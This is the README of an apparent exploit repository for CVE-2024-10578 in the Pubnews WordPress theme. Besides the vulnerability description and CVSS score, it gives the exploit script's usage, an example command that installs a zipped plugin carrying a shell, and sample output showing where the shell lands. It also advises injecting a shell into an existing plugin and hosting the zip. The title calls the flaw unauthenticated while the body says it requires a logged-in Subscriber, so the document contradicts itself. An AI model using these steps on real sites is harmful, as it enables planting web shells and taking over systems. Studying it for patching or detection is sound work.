# CVE-2024-10578: Pubnews <= 1.0.7 - Unauthenticated Arbitrary Plugin Installation

## Description

The Pubnews theme for WordPress is vulnerable to unauthorized arbitrary plugin installation due to a missing capability check on the `pubnews_importer_plugin_action_for_notice()` function in all versions up to, and including, 1.0.7. This vulnerability allows authenticated attackers with Subscriber-level access and above to install arbitrary plugins that can be leveraged to exploit other vulnerabilities.

### CWE
- CWE-434: Unrestricted Upload of File with Dangerous Type

### CVSS
- **Score:** 8.8 (HIGH)
- **Version:** 3.1
- **Vector String:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Exploit Script: wordpress_exploit.py

This script exploits the vulnerability in the Pubnews theme to install an arbitrary plugin from a provided URL. The plugin can contain a malicious shell or any other payload.

### Usage

```sh

CVE-2024-10578.py [-h] -u URL -un USERNAME -p PASSWORD -url_zip PLUGIN_URL

Pubnews <= 1.0.7 - Unauthenticated Arbitrary Plugin Installation # By Nxploited, Khaled alenazi

options:
  -h, --help            show this help message and exit
  -u, --url URL         The URL of the WordPress site
  -un, --username USERNAME
                        The username for WordPress login
  -p, --password PASSWORD
                        The password for WordPress login
  -url_zip, --plugin_url PLUGIN_URL
                        The plugin URL to install (must be a zip file with the shell injected inside)
```

### Example

```sh
python 
CVE-2024-10578.py -u http://target/wordpress -un admin -p admin -url_zip http://target/shell1.zip
```

### Output

```sh
[+] Logged in successfully.
[+] Admin _wpnonce extracted: 6bf22371ab
[+] Plugin installed successfully.
[+] Plugin extracted. You can find the shell here: /wp-content/plugins/shell1/
```

### Important Notes

- The plugin URL must be a direct link to a zip file that contains the shell or any other payload.
- It is recommended to use any existing WordPress plugin, inject the shell inside it, and then zip it again. Upload this zip file to a direct link for exploitation.

### ⚠️ Disclaimer

This script is intended for educational purposes only. The author does not condone the use of this script for illegal activities. Use it responsibly and only on systems you have explicit permission to test.

*By: Nxploited | Khaled Alenazi*
